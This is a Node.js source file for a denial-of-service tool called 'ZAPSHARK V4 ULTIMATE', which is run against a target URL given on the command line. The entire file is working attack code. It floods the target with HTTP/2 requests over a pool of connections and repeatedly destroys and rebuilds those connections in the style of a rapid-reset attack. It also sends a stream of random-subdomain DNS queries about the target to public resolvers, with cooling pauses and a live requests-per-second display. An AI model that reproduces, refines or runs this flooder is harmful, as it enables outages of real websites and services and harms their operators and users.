const http2 = require('http2');
const dgram = require('dgram');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V4_ULTIMATE {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // CONNECTION SYSTEM
        this.connectionPool = [];
        this.connCount = 12;
        
        // REQUEST RATIO (89% HEAD, 10% GET, 1% POST)
        this.headCount = 0;
        this.getCount = 0;
        
        // RAPID RESET
        this.lastConnectionReset = Date.now();
        this.resetInterval = 700; // 500-850ms
        
        // PAYLOAD SYSTEM
        this.payloadCounter = 0;
        this.payloadThreshold = 1000000 + Math.random() * 4000000;
        
        // DNS SPAM SYSTEM
        this.dnsSocket = dgram.createSocket('udp4');
        this.dnsQueries = 0;
        this.lastDnsFlood = Date.now();
        
        // RESPONSE TRACKING
        this.lastResponseCode = 0;
        this.responseCodes = {};
        
        // MAINTENANCE
        this.lastMaintenance = Date.now();
        this.maintenanceActive = false;
        
        // INTERVALS
        this.attackInterval = null;
        this.mainLoop = null;
        this.dnsInterval = null;
    }

    // === CONNECTION SYSTEM ===
    createConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 65536
            });
            
            client.setMaxListeners(1000);
            client.on('error', () => {});
            
            return { client, created: Date.now(), requests: 0 };
        } catch (err) {
            return null;
        }
    }

    buildConnectionPool() {
        this.connectionPool = [];
        for (let i = 0; i < this.connCount; i++) {
            const conn = this.createConnection();
            if (conn) {
                this.connectionPool.push(conn);
            }
        }
    }

    // === RAPID RESET ===
    performRapidReset() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.resetInterval) {
            // AUTO ADJUST 500-850ms
            this.resetInterval = 500 + Math.random() * 350;
            
            // RESET 25% OF CONNECTIONS
            const resetCount = Math.ceil(this.connectionPool.length * 0.25);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                if (this.connectionPool[index]) {
                    try {
                        this.connectionPool[index].client.destroy();
                        const newConn = this.createConnection();
                        if (newConn) {
                            this.connectionPool[index] = newConn;
                        }
                    } catch (err) {}
                }
            }
            
            this.lastConnectionReset = now;
        }
    }

    // === REQUEST TYPE SELECTOR ===
    getRequestType() {
        const rand = Math.random() * 100;
        
        // 89% HEAD, 10% GET, 1% POST
        if (rand < 89) {
            this.headCount++;
            return 'HEAD';
        } else if (rand < 99) {
            this.getCount++;
            return 'GET';
        } else {
            return 'POST';
        }
    }

    // === ATTACK SYSTEM ===
    sendRequest() {
        if (this.maintenanceActive || this.connectionPool.length === 0) return;
        
        // CHECK FOR PAYLOAD
        const sendPayload = this.payloadCounter++ >= this.payloadThreshold;
        if (sendPayload) {
            this.payloadCounter = 0;
            this.payloadThreshold = 1000000 + Math.random() * 4000000;
        }
        
        const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
        if (!conn) return;

        const method = this.getRequestType();
        
        try {
            const headers = {
                ':method': method,
                ':path': '/?' + Date.now(),
                ':authority': this.hostname,
                'user-agent': 'Mozilla/5.0'
            };
            
            // ADD PAYLOAD HEADER IF TIME
            if (sendPayload) {
                headers['x-payload'] = 'T.Ø.Š-$HĀRKWIRE-TØR';
            }
            
            const req = conn.client.request(headers);
            conn.requests++;
            
            req.on('response', (headers) => {
                const code = headers[':status'] || 0;
                this.lastResponseCode = code;
                this.responseCodes[code] = (this.responseCodes[code] || 0) + 1;
                req.destroy();
            });
            
            req.on('error', () => {
                req.destroy();
            });
            
            req.on('close', () => {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            });
            
            req.end();
            
        } catch (err) {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    // === DNS SPAM SYSTEM ===
    startDnsSpam() {
        this.dnsInterval = setInterval(() => {
            // SEND 50 DNS QUERIES PER INTERVAL
            for (let i = 0; i < 50; i++) {
                try {
                    const dnsQuery = this.createDnsQuery();
                    this.dnsSocket.send(dnsQuery, 53, '8.8.8.8', (err) => {
                        if (!err) this.dnsQueries++;
                    });
                    
                    // ALSO SEND TO 1.1.1.1
                    this.dnsSocket.send(dnsQuery, 53, '1.1.1.1', (err) => {
                        if (!err) this.dnsQueries++;
                    });
                } catch (err) {}
            }
            
            // FLUSH DNS CACHE EVERY 10s
            if (Date.now() - this.lastDnsFlood > 10000) {
                exec('ipconfig /flushdns >nul 2>&1 || echo ""', () => {});
                this.lastDnsFlood = Date.now();
            }
        }, 100);
    }

    createDnsQuery() {
        // CREATE RANDOM DNS QUERY
        const randomSubdomain = Math.random().toString(36).substring(2, 15) + '.' + this.hostname;
        const buf = Buffer.alloc(512);
        
        // SIMPLE DNS HEADER
        buf.writeUInt16BE(Math.floor(Math.random() * 65535), 0); // ID
        buf[2] = 0x01; // Standard query
        buf[3] = 0x00; // Flags
        buf.writeUInt16BE(0x0001, 4); // Questions
        buf.writeUInt16BE(0x0000, 6); // Answer RRs
        buf.writeUInt16BE(0x0000, 8); // Authority RRs
        buf.writeUInt16BE(0x0000, 10); // Additional RRs
        
        // WRITE DOMAIN
        let pos = 12;
        const parts = randomSubdomain.split('.');
        parts.forEach(part => {
            buf[pos++] = part.length;
            buf.write(part, pos);
            pos += part.length;
        });
        buf[pos++] = 0x00; // End of domain
        
        // QUERY TYPE A (1), CLASS IN (1)
        buf.writeUInt16BE(0x0001, pos); pos += 2;
        buf.writeUInt16BE(0x0001, pos); pos += 2;
        
        return buf.slice(0, pos);
    }

    // === STABILITY ===
    flushMemory() {
        // DROP INACTIVE CONNECTIONS EVERY 10s
        const now = Date.now();
        if (now % 10000 < 100) { // Every ~10s
            this.connectionPool = this.connectionPool.filter(conn => {
                try {
                    if (conn.requests === 0 && (now - conn.created) > 15000) {
                        conn.client.destroy();
                        return false;
                    }
                    return true;
                } catch (err) {
                    return false;
                }
            });
            
            // REFILL POOL
            while (this.connectionPool.length < this.connCount) {
                const newConn = this.createConnection();
                if (newConn) {
                    this.connectionPool.push(newConn);
                }
            }
        }
    }

    throttleCPU() {
        // AUTO THROTTLE BASED ON LOAD
        const load = os.loadavg()[0] / os.cpus().length;
        if (load > 0.85) {
            this.resetInterval = Math.min(850, this.resetInterval + 50);
        } else if (load < 0.70) {
            this.resetInterval = Math.max(500, this.resetInterval - 30);
        }
    }

    // === MAINTENANCE ===
    checkMaintenance() {
        const now = Date.now();
        
        if (!this.maintenanceActive && now - this.lastMaintenance >= 1200000) { // 20 mins
            this.startMaintenance();
        }
        
        if (this.maintenanceActive && now - this.lastMaintenance >= 2400000) { // 40 mins total
            this.endMaintenance();
        }
    }

    startMaintenance() {
        console.log('\n[!] MAINTENANCE - COOLING 20 MINUTES [!]');
        this.status = "COOLING";
        this.maintenanceActive = true;
        this.lastMaintenance = Date.now();
        
        // STOP ATTACKS
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = null;
        }
        
        // STOP DNS SPAM
        if (this.dnsInterval) {
            clearInterval(this.dnsInterval);
            this.dnsInterval = null;
        }
        
        // FLUSH EVERYTHING IN BACKGROUND
        this.backgroundFlush();
    }

    backgroundFlush() {
        if (!this.maintenanceActive) return;
        
        const flushInterval = setInterval(() => {
            if (!this.maintenanceActive) {
                clearInterval(flushInterval);
                return;
            }
            
            // FLUSH EVERY 1 MINUTE
            exec('ipconfig /flushdns >nul 2>&1 || echo ""', () => {});
            exec('echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse 2>/dev/null || echo ""', () => {});
            
        }, 60000);
    }

    endMaintenance() {
        console.log('\n[+] MAINTENANCE COMPLETE - RESUMING [+]');
        this.status = "ATTACKING";
        this.maintenanceActive = false;
        this.lastMaintenance = Date.now();
        
        // REBUILD CONNECTIONS
        this.buildConnectionPool();
        
        // RESTART SYSTEMS
        setTimeout(() => {
            this.startAttackLoop();
            this.startDnsSpam();
        }, 2000);
    }

    // === LOGGING ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    getMostCommonResponse() {
        let maxCount = 0;
        let commonCode = this.lastResponseCode || 0;
        
        for (const [code, count] of Object.entries(this.responseCodes)) {
            if (count > maxCount) {
                maxCount = count;
                commonCode = parseInt(code);
            }
        }
        return commonCode;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const maintenanceTime = this.maintenanceActive ? 
            `${Math.floor((2400000 - (Date.now() - this.lastMaintenance)) / 60000)}m` :
            `${Math.floor((1200000 - (Date.now() - this.lastMaintenance)) / 60000)}m`;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK — (${runtimeStr}) | STATUS: ${this.status}`);
        console.log('============================');
        console.log(`SHARK-TRS — ${this.totalRequests.toLocaleString()}`);
        console.log(`SHARK-LHC — ${this.getMostCommonResponse()}`);
        console.log('============================');
        console.log(`ZAP-SHARK — CONNECTIONS: ${this.connectionPool.length} | DNS: ${this.dnsQueries.toLocaleString()}`);
        console.log(`RPS: ${this.currentRPS.toFixed(1)} | HEAD/GET: ${this.headCount}/${this.getCount}`);
        console.log(`NEXT MAINTENANCE: ${maintenanceTime} | PAYLOAD IN: ${(this.payloadThreshold - this.payloadCounter).toLocaleString()}`);
        console.log('============================');
    }

    // === MAIN ===
    startAttackLoop() {
        if (this.attackInterval) clearInterval(this.attackInterval);
        
        this.attackInterval = setInterval(() => {
            if (!this.maintenanceActive) {
                // SEND 10 REQUESTS PER TICK
                for (let i = 0; i < 10; i++) {
                    this.sendRequest();
                }
            }
        }, 0.05); // FAST LOOP
    }

    start() {
        console.log('=== ZAP-SHARK V4 ULTIMATE ===');
        console.log('Target:', this.targetUrl);
        console.log('Ratio: HEAD 89% | GET 10% | POST 1%');
        console.log('DNS Spam: Active');
        console.log('='.repeat(50));
        
        this.buildConnectionPool();
        
        setTimeout(() => {
            // MAIN LOOP
            this.mainLoop = setInterval(() => {
                this.performRapidReset();
                this.flushMemory();
                this.throttleCPU();
                this.checkMaintenance();
                this.updateDisplay();
            }, 100);
            
            // ATTACK LOOP
            this.startAttackLoop();
            
            // DNS SPAM
            this.startDnsSpam();
            
        }, 2000);
        
        process.on('SIGINT', () => {
            console.log('\n\n=== FINAL STATS ===');
            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`HEAD Requests: ${this.headCount.toLocaleString()}`);
            console.log(`GET Requests: ${this.getCount.toLocaleString()}`);
            console.log(`DNS Queries: ${this.dnsQueries.toLocaleString()}`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.mainLoop);
            clearInterval(this.attackInterval);
            clearInterval(this.dnsInterval);
            
            this.connectionPool.forEach(conn => {
                try { conn.client.destroy(); } catch (err) {}
            });
            
            if (this.dnsSocket) this.dnsSocket.close();
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node shark.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V4_ULTIMATE(target);
shark.start();
